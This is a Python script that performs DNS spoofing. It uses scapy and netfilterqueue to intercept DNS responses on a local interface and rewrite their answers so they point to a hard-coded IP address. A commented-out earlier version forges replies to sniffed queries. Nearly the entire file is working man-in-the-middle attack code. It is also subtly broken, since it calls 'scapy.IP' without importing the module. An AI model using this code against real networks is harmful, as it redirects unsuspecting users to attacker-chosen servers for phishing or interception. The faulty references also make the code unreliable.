from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP
import netfilterqueue

'''def dns_response(packet, interface, redirected_webserver, victim_webserver = None):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Check if it's a DNS query
        # Extract the DNS query details
        dns_query = packet.getlayer(DNS)
        dns_id = dns_query.id
        dns_qname = dns_query.qd.qname
        dns_qtype = dns_query.qd.qtype
        dns_qclass = dns_query.qd.qclass

        print("got DNS packet")
        
        if victim_webserver in dns_qname.decode() or victim_webserver is None:
            # Create DNS response packet
            dns_response = DNS(
                id=dns_id,
                qr=1,  # QR flag: Response
                aa=1,  # AA flag: Authoritative Answer
                qdcount=1,  # Number of questions
                ancount=1,  # Number of answers
                nscount=0,  # Number of authoritative name servers
                arcount=0,  # Number of additional records
                qd=DNSQR(qname=dns_qname, qtype=dns_qtype, qclass=dns_qclass),  # DNS question section
                an=DNSRR(rrname=dns_qname, type=dns_qtype, rclass=dns_qclass, ttl=3600, rdata=redirected_webserver),  # DNS answer section
            )
            
            # Create IP packet
            ip_packet = IP(dst=packet[IP].src, src=packet[IP].dst)
            
            # Create UDP packet
            udp_packet = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
            
            # Construct the final packet
            response_packet = ip_packet / udp_packet / dns_response
            
            # Send the response packet
            send(response_packet, verbose=0, iface=interface)
            print("Sent forged packet")
        else:
            print("Not important")'''

redirected_webserver = "131.155.194.237"
victim_webserver = None

def dns_response(pkt):#, interface, redirected_webserver, victim_webserver = None):
    packet = scapy.IP(pkt.get_payload())
    print("Got packet")
    if packet.haslayer(scapy.DNSRR):
        print("Got DNS response packet")
        qname = packet[scapy.DNSQR].qname

        if victim_webserver in qname.decode() or victim_webserver is None:
            packet[scapy.DNSRR].rdata = redirected_webserver
            
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.UDP].len
            del packet[scapy.UDP].chksum

            pkt.set_payload(bytes(packet))
            print("DNS packet was modified")
    
    pkt.accept()
    print("Packet forwarded")

def dns_attack(interface, redirected_webserver, victim_webserver = None):
    #bpf_filter = 'udp and port 53'
    
    #sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver), iface = interface)
    queue = netfilterqueue.NetfilterQueue()

    # Bind the queue to the nfqueue subsystem, specify the callback function
    queue.bind(0, dns_response)

    try:
        # Run the queue
        queue.run()
    except KeyboardInterrupt:
        # Exit gracefully on Ctrl+C
        print("[+] User interrupted.")
        # Flush the IP tables
        queue.unbind()

    


if __name__ == '__main__':
    dns_attack("wlp0s20f3", "131.155.194.237")